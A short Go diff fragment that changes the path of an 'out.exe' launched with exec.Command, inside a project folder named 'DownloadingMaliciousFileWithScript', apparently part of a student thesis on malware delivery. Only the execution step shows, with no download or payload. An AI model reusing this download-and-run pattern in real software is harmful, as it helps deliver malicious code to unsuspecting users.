@@ -12,7 +12,7 @@ func main() {
 		fmt.Println(err)
 	}
 
-	executable := exec.Command("C:/Users/acho/Desktop/diplomna/DownloadingMaliciousFileWithScript/out.exe")
+	executable := exec.Command("C:/Users/achon/onedrive/Desktop/diplomna/rra/DownloadingMaliciousFileWithScript/out.exe")
 
 	if err := executable.Run(); err != nil {
 		fmt.Println(err)
